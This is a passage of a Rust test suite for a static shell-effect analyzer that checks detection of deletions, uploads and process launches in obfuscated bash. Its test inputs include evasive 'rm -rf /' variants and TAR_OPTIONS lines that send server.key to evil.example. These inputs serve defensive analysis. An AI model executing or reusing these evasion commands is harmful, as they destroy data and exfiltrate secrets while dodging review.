            .find(|effect| effinterp_proto::display_resource(&effect.resource).contains(path))
            .unwrap();
        assert_eq!(effect.condition.is_some(), conditional);
    }
}

#[test]
fn named_fd_exec_redirections_preserve_following_commands() {
    for redirect in [
        "{lock}>/tmp/lockfile",
        "{fd}<&-",
        "{fd}>&-",
        "{fd}<>/tmp/lockfile",
        "{fd}>&1",
        "{fd}<<<value",
        "{fd}<<EOF\nvalue\nEOF",
    ] {
        let source = format!("exec {redirect}\nrm /tmp/live");
        let plan = shell(&source, None);
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.delete"
                    && effinterp_proto::display_resource(&effect.resource).contains("/tmp/live")
                    && effect.condition.is_none()
            }),
            "{source}: {:?}",
            plan.effects
        );
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "process.exec")
                .count(),
            1,
            "{source}: {:?}",
            plan.effects
        );
        assert_eq!(
            plan.boundaries.iter().any(|boundary| {
                boundary.reason.as_str() == "unsupported_shell_syntax"
                    && boundary
                        .detail
                        .as_deref()
                        .is_some_and(|detail| detail.contains("descriptor"))
            }),
            redirect.ends_with("&-"),
            "{source}: {:?}",
            plan.boundaries
        );
        if redirect.contains("/tmp/lockfile") {
            assert!(
                plan.effects.iter().any(|effect| {
                    effect.operation.0 == "filesystem.write"
                        && effinterp_proto::display_resource(&effect.resource)
                            .contains("/tmp/lockfile")
                }),
                "{source}: {:?}",
                plan.effects
            );
        }
    }
    // Split writes must be parsed as one stream in the consumer's launch cwd.
    for source in [
        "exec {fd}> >(bash); printf 'rm -' >&$fd; printf 'rf /victim' >&$fd",
        "exec {fd}> >(bash); exec 7>&$fd-; printf 'rm -rf /victim' >&7",
        "coproc { bash; }; printf 'rm -rf /victim' >&${COPROC[1]}",
        "exec {fd}> >(bash); printf '%s' 'rm -rf /victim' >/proc/self/fd/$fd",
        "exec {fd}> >(bash); printf '%s' 'rm -rf /victim' >&$fd; exec {fd}>&-",
    ] {
        let plan = shell(source, None);
        assert!(
            delete_resources(&plan)
                .iter()
                .any(|path| effinterp_proto::display_resource(path).contains("/victim")),
            "{source}: {:?}",
            plan.boundaries
        );
    }
    for source in [
        "exec {fd}> >(bash); exec {fd}>&-; printf 'rm -rf /victim' >&$fd",
        "exec {fd}> >(bash); printf 'rm -rf /victim' >&$fd >/dev/null",
        "exec {fd}> >(bash); printf 'printf %%s ' >&$fd; printf 'rm -rf /victim' >&$fd",
    ] {
        let plan = shell(source, None);
        assert!(
            !delete_resources(&plan)
                .iter()
                .any(|path| effinterp_proto::display_resource(path).contains("/victim")),
            "{source}"
        );
    }
    let launched = shell(
        "cd /launch; exec {fd}> >(bash); cd /later; printf 'rm -rf victim' >&$fd",
        None,
    );
    assert!(
        delete_resources(&launched)
            .iter()
            .any(|resource| matches!(resource,
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                    if path == "/launch/victim"
            ))
    );
    // Quoting, whitespace, and invalid names leave real exec operands.
    for operand in ["'{fd}'>/tmp/log", "{fd} >/tmp/log", "{bad-name}>/tmp/log"] {
        let plan = shell(&format!("exec {operand}; rm /tmp/never"), None);
        assert!(!plan.effects.iter().any(|effect| {
            effinterp_proto::display_resource(&effect.resource).contains("/tmp/never")
        }));
    }
}

#[test]
fn exec_self_reread_hands_polyglot_source_to_ruby() {
    for head in ["ruby", "\"${RUBY_PATH}\""] {
        let source = format!(
            "#!/bin/bash\nexec {head} -W0 -x \"$0\" \"$@\"\n#!/usr/bin/env ruby -W0\nif ENV['CLEAN']\n  FileUtils.rm_rf('/tmp/build')\nend\nsystem('make')\n# unmatched shell quote '\n"
        );
        let plan = shell(&source, None);
        assert!(
            !plan
                .boundaries
                .iter()
                .any(
                    |boundary| boundary.reason.as_str() == "unrecoverable_source"
                        && boundary.affected_resource.is_none()
                ),
            "{:?}",
            plan.boundaries
        );
        assert!(plan.execution_graph.nodes.iter().any(|node| matches!(&node.subject, Subject::Source { language, source, .. } if language == "ruby" && source.starts_with("#!/usr/bin/env ruby"))));
        let deletion = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.delete"
                    && effinterp_proto::display_resource(&effect.resource).contains("/tmp/build")
            })
            .unwrap();
        assert!(deletion.condition.is_some());
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "process.exec"
                    && effinterp_proto::display_resource(&effect.resource).contains("make"))
        );
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "process.exec")
                .count(),
            2,
            "{:?}",
            plan.effects
        );
        assert!(
            !plan.boundaries.iter().any(|boundary| matches!(
                boundary.reason.as_str(),
                "unmodeled_command" | "parse_error"
            )),
            "{:?}",
            plan.boundaries
        );
    }
    let plan = shell(
        "exec perl -x \"$0\"\n#!/usr/bin/perl\nunlink '/tmp/not_shell';\n",
        None,
    );
    let boundaries = plan
        .boundaries
        .iter()
        .filter(|boundary| boundary.reason.as_str() == "dynamic_source")
        .collect::<Vec<_>>();
    assert_eq!(boundaries.len(), 1);
    assert!(boundaries[0].detail.as_deref().unwrap().contains("perl"));
    assert_eq!(
        plan.effects
            .iter()
            .filter(|effect| effect.operation.0 == "process.exec")
            .count(),
        1
    );
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "filesystem.delete")
    );
    let plan = shell(
        "exec curl -x \"$0\" https://example.test\n#!/usr/bin/perl\nunlink '/tmp/not_shell';\n",
        None,
    );
    assert!(
        !plan
            .boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "dynamic_source")
    );
}

#[test]
fn sourced_return_is_local_but_exit_and_exec_end_the_caller() {
    for terminator in ["return 1", "exit 0", "exec true"] {
        let sources = Sources(HashMap::from([(
            "lib.sh".into(),
            format!("{terminator}; touch /tmp/dead"),
        )]));
        let plan = Engine::new()
            .analyze_with_resolver(
                &Subject::Shell {
                    source: ". ./lib.sh; return 0; rm /tmp/after".into(),
                    cwd: None,
                    context: Default::default(),
                },
                &sources,
            )
            .unwrap();
        assert!(!plan.effects.iter().any(|effect| {
            effinterp_proto::display_resource(&effect.resource).contains("/tmp/dead")
        }));
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effinterp_proto::display_resource(&effect.resource)
                    .contains("/tmp/after")),
            terminator.starts_with("return")
        );
    }
}

/// Pinned Beads and Hermes invocations of the developer command models,
/// vendored with their upstream location and license so the shell path is
/// checked against real script and package-script shapes.
#[derive(serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct UpstreamDeveloperCommands {
    sources: std::collections::BTreeMap<String, UpstreamSource>,
    cases: Vec<UpstreamDeveloperCommandCase>,
}

#[derive(serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct UpstreamSource {
    url: String,
    commit: String,
    license: String,
    copyright: String,
}

#[derive(serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct UpstreamDeveloperCommandCase {
    id: String,
    evidence: UpstreamExcerpt,
    shape: String,
    /// Directory below the checkout root the command runs in.
    cwd: String,
    command: String,
    /// Models whose application attributes an effect or boundary to this case.
    models: Vec<String>,
    /// Exactly the effects attributed to `models`; `{root}` is the checkout root.
    effects: Vec<serde_json::Value>,
    /// Exactly the boundary reasons attributed to `models`.
    boundaries: Vec<String>,
    /// Boundary reasons that must appear anywhere in the plan.
    #[serde(default)]
    plan_boundaries: Vec<String>,
    /// Operations that must appear anywhere in the plan.
    #[serde(default)]
    plan_operations: Vec<String>,
    /// A form proven to have no effects beyond starting the process.
    #[serde(default)]
    inert: bool,
}

#[derive(serde::Deserialize)]
#[serde(deny_unknown_fields)]
struct UpstreamExcerpt {
    repository: String,
    path: String,
    lines: Vec<u32>,
    excerpt: String,
}

#[test]
fn pinned_upstream_developer_commands_match_their_attributed_effects() {
    const PINNED: [(&str, &str); 2] = [
        ("beads", "3ecbf5bc9f5168a63fc9253ee1966adfa7e99ff4"),
        ("hermes", "003af7f85ce2ebe24b38556d735a0d7678a4a8dd"),
    ];
    let fixture: UpstreamDeveloperCommands = serde_json::from_str(include_str!(
        "../fixtures/model_tranche/developer_commands_upstream_cases.json"
    ))
    .unwrap();
    for (name, commit) in PINNED {
        let source = &fixture.sources[name];
        assert_eq!(source.commit, commit, "{name}");
        assert!(source.url.starts_with("https://github.com/"), "{name}");
        assert!(!source.license.is_empty() && !source.copyright.is_empty());
    }
    // The checkout root is never created: analysis is static.
    let root = std::env::temp_dir().join("effinterp-upstream-developer-commands");
    let root = root.to_str().unwrap();
    let mut repositories = std::collections::BTreeSet::new();
    let mut models = std::collections::BTreeSet::new();
    for case in &fixture.cases {
        let id = &case.id;
        assert!(
            fixture.sources.contains_key(&case.evidence.repository),
            "{id}"
        );
        assert!(!case.evidence.path.is_empty() && !case.evidence.lines.is_empty());
        assert!(!case.shape.is_empty(), "{id}");
        assert!(
            case.evidence.excerpt.contains(&case.command),
            "{id}: the analyzed command must be verbatim upstream text"
        );
        repositories.insert(case.evidence.repository.as_str());
        models.extend(case.models.iter().map(String::as_str));

        let cwd = if case.cwd.is_empty() {
            root.to_string()
        } else {
            format!("{root}/{}", case.cwd)
        };
        let plan = shell(&case.command, Some(&cwd));
        let attributed = |refs: &[ProvenanceRef]| {
            provenance_reaches(&plan, refs, |kind| {
                matches!(kind, ProvenanceKind::ModelApplication { model }
                    if case.models.iter().any(|m| model.split('#').next() == Some(m)))
            })
        };
        let mut effects = Vec::new();
        for effect in plan.effects.iter().filter(|e| attributed(&e.provenance)) {
            assert!(
                provenance_reaches(&plan, &effect.provenance, |kind| matches!(
                    kind,
                    ProvenanceKind::SourceSpan { .. }
                )),
                "{id}: {} lacks source provenance",
                effect.operation.0
            );
            effects.push(
                serde_json::json!({"operation": effect.operation.0, "resource": effect.resource})
                    .to_string(),
            );
        }
        effects.sort();
        effects.dedup();
        let mut expected: Vec<String> = case
            .effects
            .iter()
            .map(|effect| {
                let text = effect.to_string().replace("{root}", root);
                serde_json::from_str::<serde_json::Value>(&text)
                    .unwrap()
                    .to_string()
            })
            .collect();
        expected.sort();
        assert_eq!(effects, expected, "{id}");

        let mut boundaries: Vec<&str> = plan
            .boundaries
            .iter()
            .filter(|b| attributed(&b.provenance))
            .map(|b| b.reason.as_str())
            .collect();
        boundaries.sort();
        boundaries.dedup();
        assert_eq!(boundaries, case.boundaries, "{id}");
        let reasons: std::collections::BTreeSet<&str> =
            plan.boundaries.iter().map(|b| b.reason.as_str()).collect();
        assert!(!reasons.contains("unmodeled_command"), "{id}: {reasons:?}");
        for reason in &case.plan_boundaries {
            assert!(reasons.contains(reason.as_str()), "{id}: {reasons:?}");
        }
        for operation in &case.plan_operations {
            assert!(
                plan.effects.iter().any(|e| &e.operation.0 == operation),
                "{id}: {operation}"
            );
        }
        // Only a proven inert form may end without an effect or a boundary
        // beyond the model's declared partial coverage.
        let loud =
            !case.effects.is_empty() || boundaries.iter().any(|r| *r != "reviewed_command_surface");
        assert_eq!(!loud, case.inert, "{id}");
    }
    assert_eq!(repositories, PINNED.map(|(name, _)| name).into());
    for family in [
        "p18b/database/dolt@v2",
        "p18b/devtools/js-toolchain/tsc@v2",
        "p18b/devtools/js-toolchain/eslint@v2",
        "p18b/devtools/js-toolchain/prettier@v2",
        "p18b/devtools/js-toolchain/vite@v2",
        "p18b/devtools/js-toolchain/vitest@v2",
        "p18b/devtools/js-toolchain/cross-env@v2",
        "p18b/devtools/pytest@v2",
        "p18b/devtools/gofmt@v2",
        "p18b/devtools/open@v2",
        "p18b/devtools/comm@v2",
        "p18b/devtools/s6-setuidgid@v2",
    ] {
        assert!(models.contains(family), "{family} has no upstream case");
    }
}

#[test]
fn developer_operand_shapes_preserve_resources_and_provenance() {
    let cwd = std::env::temp_dir().join("effinterp-developer-operands");
    let cwd = cwd.to_str().unwrap();
    for (command, operation, path) in [
        ("eslint --fix", "filesystem.write", ""),
        (
            "pytest tests/test_x.py::test_b",
            "filesystem.read",
            "/tests/test_x.py",
        ),
        (
            "pytest tests/test_x.py::TestA::test_b -q",
            "filesystem.read",
            "/tests/test_x.py",
        ),
        (
            "pytest 'tests/test_x.py::test_b[param::value]'",
            "filesystem.read",
            "/tests/test_x.py",
        ),
        ("open ./report.pdf", "filesystem.read", "/report.pdf"),
    ] {
        let plan = shell(command, Some(cwd));
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == operation)
            .collect();
        assert_eq!(effects.len(), 1, "{command}: {effects:?}");
        let effect = effects[0];
        assert_eq!(
            effect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: format!("{cwd}{path}")
                }
            },
            "{command}"
        );
        for source in [true, false] {
            assert!(
                provenance_reaches(&plan, &effect.provenance, |kind| if source {
                    matches!(kind, ProvenanceKind::SourceSpan { .. })
                } else {
                    matches!(kind, ProvenanceKind::ModelApplication { .. })
                }),
                "{command}"
            );
        }
        if command.starts_with("pytest") {
            assert!(
                plan.effects
                    .iter()
                    .any(|e| e.operation.0 == "process.code_execution")
            );
        }
    }
    for command in ["pytest \"$CASE::test_b\"", "pytest ::test_b"] {
        let plan = shell(command, Some(cwd));
        let reads: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.0 == "filesystem.read")
            .collect();
        assert_eq!(reads.len(), 1, "{command}");
        assert!(
            matches!(&reads[0].resource, ResourceExpr::Unresolved { family } if family.0 == "filesystem"),
            "{command}"
        );
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "process.code_execution")
        );
    }
    for command in [
        "open mailto:a@b.c",
        "open file:///etc/passwd",
        "open \"http://$H/x\"",
        "open \"$TARGET\"",
    ] {
        let plan = shell(command, Some(cwd));
        assert!(
            !plan.effects.iter().any(|e| matches!(
                e.operation.0.as_str(),
                "filesystem.read" | "network.request"
            )),
            "{command}"
        );
        let boundary = plan
            .boundaries
            .iter()
            .find(|b| b.reason.as_str() == "unrecognized_arguments")
            .expect(command);
        assert_eq!(
            boundary.class,
            if command.contains('$') {
                BoundaryClass::Unresolved
            } else {
                BoundaryClass::Unmodeled
            }
        );
        assert!(
            provenance_reaches(&plan, &boundary.provenance, |kind| matches!(
                kind,
                ProvenanceKind::SourceSpan { .. }
            )),
            "{command}"
        );
    }
}

// Prefix assignments must reach package writes, and the bunx wrapper must retain
// nested npm publication rather than stopping at package-runner effects.
#[test]
fn brew_prefix_and_bunx_publish_survive_shell_context() {
    let plan = shell(
        "HOMEBREW_PREFIX=/custom brew install ripgrep",
        Some("/work"),
    );
    assert!(plan.effects.iter().any(|e| e.operation.0 == "filesystem.write" && matches!(&e.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/custom")));
    for source in ["bunx npm publish", "bunx --bun npm publish"] {
        let plan = shell(source, Some("/work"));
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|b| b.reason == "unmodeled_command" || b.reason == "unrecognized_arguments")
        );
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "artifact.publish"),
            "{source}: {:?}",
            plan.effects
        );
        assert!(plan.execution_graph.nodes.iter().any(|node| matches!(&node.subject, Subject::Exec { argv, .. } if argv == &["npm", "publish"])));
    }
}

#[test]
fn observed_absence_is_distinct_from_empty_unknown_and_nested_overrides() {
    let analyze = |source: &str, value: Option<&str>, absent: bool| {
        let mut context = HostContext::default();
        if let Some(value) = value {
            context.env.insert("TARGET".into(), value.into());
            context.env.insert("HOME".into(), value.into());
        }
        if absent {
            context.env_unset.insert("TARGET".into());
            context.env_unset.insert("HOME".into());
        }
        Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: Some("/repo".into()),
                context,
            })
    };
    let paths = |plan: &Plan| {
        plan.effects
            .iter()
            .filter_map(|effect| {
                if effect.operation.0 != "filesystem.delete" {
                    return None;
                }
                match &effect.resource {
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path },
                    } => Some(path.clone()),
                    _ => None,
                }
            })
            .collect::<std::collections::BTreeSet<_>>()
    };
    for command in [
        "rm -- \"${TARGET-/tmp/fallback}/child\"",
        "sh -c 'rm -- \"${TARGET-/tmp/fallback}/child\"'",
        "TARGET=/temporary echo ok; rm -- \"${TARGET-/tmp/fallback}/child\"",
        "TARGET=/temporary /usr/bin/printf ok; rm -- \"${TARGET-/tmp/fallback}/child\"",
        "TARGET=/temporary sh -c 'printf ok'; rm -- \"${TARGET-/tmp/fallback}/child\"",
    ] {
        for (value, absent, expected) in [
            (None, true, "/tmp/fallback/child"),
            (Some(""), false, "/child"),
            (Some("/safe"), false, "/safe/child"),
        ] {
            let plan = analyze(command, value, absent).unwrap();
            validate_plan(&plan).unwrap();
            assert_eq!(
                paths(&plan),
                std::collections::BTreeSet::from([expected.into()]),
                "{command}: {plan:#?}"
            );
        }
    }
    for command in [
        r#"rm -- ''"#,
        r#"rm -rf "$TARGET""#,
        r#"TARGET=/temporary /usr/bin/printf ok; rm -- "$TARGET""#,
        r#"HOME=/tmp/example echo ok; rm -rf "$HOME""#,
        r#"HOME=/tmp/example USERPROFILE=/tmp/example echo ok; rm -rf "$HOME""#,
        r#"HOME=/tmp/example sh -c 'printf ok'; rm -rf "$HOME""#,
    ] {
        for (value, absent) in [(None, true), (Some(""), false)] {
            let plan = analyze(command, value, absent).unwrap();
            validate_plan(&plan).unwrap();
            assert!(delete_resources(&plan).is_empty(), "{command}: {plan:#?}");
            assert!(
                plan.effects.iter().any(|effect| {
                    effect.operation.0 == "process.exec"
                        && matches!(&effect.resource, ResourceExpr::Concrete {
                        identity: ResourceIdentity::Process { executable, argv, .. }
                    } if executable == "rm" && argv.last().is_some_and(|arg| matches!(arg,
                        ResourceExpr::Literal { value } if value.is_empty())))
                }),
                "{command}: the attempted rm process disappeared"
            );
        }
    }
    for command in [r#"rm -- '' /kept"#, r#"rm -- "$TARGET" /kept"#] {
        let plan = analyze(command, None, true).unwrap();
        validate_plan(&plan).unwrap();
        assert_eq!(
            paths(&plan),
            std::collections::BTreeSet::from(["/kept".into()])
        );
        assert_eq!(delete_resources(&plan).len(), 1);
    }
    let unknown_home =
        analyze(r#"HOME=/tmp/example echo ok; rm -rf "$HOME""#, None, false).unwrap();
    validate_plan(&unknown_home).unwrap();
    assert!(
        delete_resources(&unknown_home)
            .iter()
            .any(|resource| matches!(
                resource, ResourceExpr::Environment { name } if name == "HOME"
            ))
    );
    let unknown = analyze("rm -- \"$TARGET/child\"", None, false).unwrap();
    assert!(!paths(&unknown).contains("/child"));
    let overridden = analyze(
        "env TARGET=/safe sh -c 'rm -- \"${TARGET-/tmp/fallback}/child\"'",
        None,
        true,
    )
    .unwrap();
    assert_eq!(
        paths(&overridden),
        std::collections::BTreeSet::from(["/safe/child".into()])
    );
    assert!(matches!(
        analyze("true", Some(""), true),
        Err(effinterp_engine::EngineError::InvalidSubject(_))
    ));
}

#[test]
fn conditional_alternatives_survive_a_resolver() {
    let subject = Subject::Shell {
        source: "TOOL=echo; true && TOOL=rm || TOOL=echo; \"$TOOL\" -rf /".to_string(),
        cwd: Some("/workspace/project".to_string()),
        context: Default::default(),
    };
    // A resolver answers for sourced files; it says nothing about which arm
    // of a `&&`/`||` chain assigned the command name, so both plans must
    // reach the same executables.
    let resolved = Engine::new()
        .with_resolver(Box::new(Sources(HashMap::new())))
        .analyze(&subject)
        .unwrap();
    validate_plan(&resolved).unwrap();
    for plan in [&Engine::new().analyze(&subject).unwrap(), &resolved] {
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.as_str() == "filesystem.delete"),
            "the rm alternative is unreachable: {:?}",
            plan.effects
                .iter()
                .map(|effect| effect.operation.as_str())
                .collect::<Vec<_>>()
        );
    }
}

#[test]
fn conditional_literal_assignments_stay_literal_alternatives() {
    // After a loop body or a `&&`/`||` operand the name holds either literal,
    // so a command inheriting it sees both rather than an unknown value.
    for source in [
        "export TAR_OPTIONS=''; while test -e marker; do TAR_OPTIONS='--create --file=evil.example:/archive'; done; tar -- source/server.key",
        "export TAR_OPTIONS='--create --file=evil.example:/archive'; test -e marker && TAR_OPTIONS=''; tar -- source/server.key",
        "export TAR_OPTIONS=''; test -e marker || TAR_OPTIONS='--create --file=evil.example:/archive'; tar -- source/server.key",
    ] {
        let plan = Engine::new()
            .with_resolver(Box::new(Sources(HashMap::new())))
            .analyze(&Subject::Shell {
                source: source.to_string(),
                cwd: Some("/work".to_string()),
                context: Default::default(),
            })
            .unwrap();
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "network.upload"),
            "{source}: {:?}",
            plan.boundaries
        );
    }
}

#[test]
fn exported_shell_state_reaches_archive_requests_without_guessing_branches() {
    for source in [
        "export TAR_OPTIONS=''; true && TAR_OPTIONS='--create --file=evil.example:/archive' && false && TAR_OPTIONS=''; tar -- source/server.key",
        "export TAR_OPTIONS=''; for value in '--create --file=evil.example:/archive' ''; do TAR_OPTIONS=\"$value\"; break; done; tar -- source/server.key",
        "export TAR_OPTIONS=''; for value in '--create --file=evil.example:/archive' ''; do TAR_OPTIONS=\"$value\"; false; break; done && tar -- source/server.key",
        "export TAR_OPTIONS=''; declare -n REF=TAR_OPTIONS; REF='--create --file=evil.example:/archive'; tar -- source/server.key",
        "export TAR_OPTIONS=''; declare -n REF=TAR_OPTIONS; printf -v REF %s '--create --file=evil.example:/archive'; tar -- source/server.key",
        "export TAR_OPTIONS=''; declare -n REF=TAR_OPTIONS; read REF <<< '--create --file=evil.example:/archive'; tar -- source/server.key",
        "export TAR_OPTIONS; if test -e marker; then TAR_OPTIONS=''; else TAR_OPTIONS='--create --file=evil.example:/archive'; fi; tar -- source/server.key",
        "unset COND; export TAR_OPTIONS; if \"$COND\"; then TAR_OPTIONS=''; else TAR_OPTIONS='--create --file=evil.example:/archive'; fi; tar -- source/server.key",
    ] {
        let plan = shell(source, Some("/work"));
        let upload = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "network.upload")
            .unwrap_or_else(|| panic!("{source}: {:?}", plan.boundaries));
        assert_eq!(
            upload.condition.is_some(),
            source.contains("test -e marker"),
            "{source}: {upload:?}"
        );
        let read = plan.effects.iter().find(|effect| effect.operation.0 == "filesystem.read" && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/work/source/server.key")).unwrap();
        if source.contains("test -e marker") {
            assert_eq!(read.condition, upload.condition, "{source}");
        }
    }
    let observed = Engine::new().analyze(&Subject::Shell {
        source: "export TAR_OPTIONS; if \"$COND\"; then TAR_OPTIONS=''; else TAR_OPTIONS='--create --file=evil.example:/archive'; fi; tar -- source/server.key".into(),
        cwd: Some("/work".into()),
        context: HostContext { env_unset: ["COND".into()].into_iter().collect(), ..Default::default() },
    }).unwrap();
    validate_plan(&observed).unwrap();
    assert!(
        observed
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "network.upload" && effect.condition.is_none())
    );
    for source in [
        "declare -n A=B B=A; A=rm; \"$A\" /tmp/x",
        "export TAR_OPTIONS=''; false && TAR_OPTIONS='--create --file=evil.example:/archive'; tar -- source/server.key",
    ] {
        let plan = shell(source, Some("/work"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "network.upload"
                    || effect.operation.0 == "filesystem.delete"),
            "{source}: {:?}",
            plan.effects
        );
    }
}

#[test]
fn short_circuit_function_definition_follows_the_operand_status() {
    let skipped = shell("false && rm(){ :; }; rm -rf /", None);
    assert!(has_delete(&skipped, "/"), "{:?}", ops(&skipped));
    let defined = shell("true && rm(){ :; }; rm -rf /", None);
    assert!(!has_delete(&defined, "/"), "{:?}", ops(&defined));
}

#[test]
fn readonly_function_keeps_its_body() {
    for source in [
        "f(){ rm -rf /; }; readonly -f f; f(){ :; }; f",
        "f(){ rm -rf /; }; declare -fr f; f(){ :; }; f",
        "f(){ rm -rf /; }; typeset -r -f f; f(){ :; }; f",
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/"), "{source}: {:?}", ops(&plan));
    }
    let redefined = shell("f(){ rm -rf /; }; declare -f f; f(){ :; }; f", None);
    assert!(!has_delete(&redefined, "/"), "{:?}", ops(&redefined));
}

#[test]
fn builtin_and_command_prefixes_run_shell_builtins() {
    for source in [
        r#"TOOL=echo; builtin export TOOL=rm; "$TOOL" -rf /"#,
        r#"TOOL=echo; builtin -- export TOOL=rm; "$TOOL" -rf /"#,
        r#"TOOL=echo; command export TOOL=rm; "$TOOL" -rf /"#,
        r#"TOOL=echo; command -p export TOOL=rm; "$TOOL" -rf /"#,
        "f(){ rm -rf /; }; command eval f",
        "f(){ rm -rf /; }; builtin eval f",
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/"), "{source}: {:?}", ops(&plan));
    }
    // The prefix skips a function that shadows the builtin.
    let shadowed = shell(
        r#"export(){ :; }; TOOL=echo; builtin export TOOL=rm; "$TOOL" -rf /"#,
        None,
    );
    assert!(has_delete(&shadowed, "/"), "{:?}", ops(&shadowed));
}

#[test]
fn captured_literal_output_names_the_command() {
    for source in [
        "$(printf rm) -rf /",
        "$(printf r)m -rf /",
        "$(/usr/bin/printf rm) -rf /",
        r#"TOOL=$(printf rm); "$TOOL" -rf /"#,
    ] {
        let plan = shell(source, None);
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", "/"], "{source}");
        assert!(has_delete(&plan, "/"), "{source}: {:?}", ops(&plan));
    }
}

#[test]
fn assigning_default_persists_where_bash_keeps_it() {
    for source in [
        r#"target=safe; target= value="${target:=/}" :; rm -rf "$target""#,
        r#"unset target; : "${target[0]:=/}"; rm -rf "$target""#,
        r#"unset target; for value in "${target:=/}"; do :; done; rm -rf "$target""#,
        "unset target; : <<EOF\n${target:=/}\nEOF\nrm -rf \"$target\"",
        "unset target; { :; } <<EOF\n'${target:=/}'\nEOF\nrm -rf \"$target\"",
        r#"unset target; : <<<"${target:=/}"; rm -rf "$target""#,
        r#"unset target; { :; } <<<"${target:=/}"; rm -rf "$target""#,
    ] {
        let plan = shell(source, None);
        assert!(has_delete(&plan, "/"), "{source}: {:?}", ops(&plan));
    }
    // A null command's and a subshell's here-string assign in a child.
    for source in [
        "unset target; <<<\"${target:=/}\"\nrm -rf \"$target\"",
        r#"unset target; ( : ) <<<"${target:=/}"; rm -rf "$target""#,
    ] {
        let plan = shell(source, None);
        assert!(!has_delete(&plan, "/"), "{source}: {:?}", ops(&plan));
    }
}

#[test]
fn glob_variable_command_is_an_unresolved_command() {
    let plan = shell("TOOL='r*'; $TOOL -rf /", None);
    assert!(
        plan.effects.iter().any(|effect| {
            effect.operation.0 == "process.code_execution"
                && effect.attributes.get("derivation")
                    == Some(&AttrValue::String("unresolved_command".into()))
        }),
        "{:?}",
        ops(&plan)
    );
    let quoted = shell("TOOL='r*'; \"$TOOL\" -rf /", None);
    assert!(
        !quoted.effects.iter().any(|effect| {
            effect.attributes.get("derivation")
                == Some(&AttrValue::String("unresolved_command".into()))
        }),
        "{:?}",
        ops(&quoted)
    );
    // A pattern spelled as the command name selects the program the same
    // way; `[`, a quoted pattern and a brace expansion name one program.
    let unresolved = |source: &str| {
        shell(source, None).effects.iter().any(|effect| {
            effect.attributes.get("derivation")
                == Some(&AttrValue::String("unresolved_command".into()))
        })
    };
    for source in ["r? -rf /", "r[ma] -rf /", "{destination:?}: x"] {
        assert!(unresolved(source), "{source}");
    }
    for source in ["[ -f x ]", "[[ -f x ]]", "'r?' -rf /", "r{m,x} -rf /"] {
        assert!(!unresolved(source), "{source}");
    }
}

#[test]
fn coprocess_recursion_grows_processes() {
    let plan = shell("f(){ coproc f; }; f", None);
    assert!(
        plan.effects.iter().any(|effect| {
            effect.attributes.get("process_growth")
                == Some(&AttrValue::String("unbounded_background_recursion".into()))
        }),
        "{:?}",
        ops(&plan)
    );
}

#[test]
fn arithmetic_command_assigns_in_the_current_shell() {
    for src in [
        "((n=3)); rm -rf \"/q$n\"",
        "((n=1+2)); rm -rf \"/q$n\"",
        "m=3; ((n=m)); rm -rf \"/q$n\"",
    ] {
        assert!(has_delete(&shell(src, None), "/q3"), "{src}");
    }
    // A subshell's assignment does not reach the shell.
    assert!(!has_delete(
        &shell("( (n=3) ); rm -rf \"/q$n\"", None),
        "/q3"
    ));
}

#[test]
fn unset_f_removes_the_function() {
    for src in [
        "rm(){ :; }; unset -f rm; rm -rf /q",
        "rm(){ :; }; unset -f -- rm; rm -rf /q",
        // A conditional unset leaves a path where the program runs.
        "rm(){ :; }; test -f x && unset -f rm; rm -rf /q",
        "rm(){ :; }; if test -f x; then unset -f rm; fi; rm -rf /q",
    ] {
        assert!(has_delete(&shell(src, None), "/q"), "{src}");
    }
    for src in [
        "rm(){ :; }; readonly -f rm; unset -f rm; rm -rf /q",
        "rm(){ :; }; unset -v rm; rm -rf /q",
        "rm(){ :; }; if false; then unset -f rm; fi; rm -rf /q",
    ] {
        assert!(!has_delete(&shell(src, None), "/q"), "{src}");
    }
}
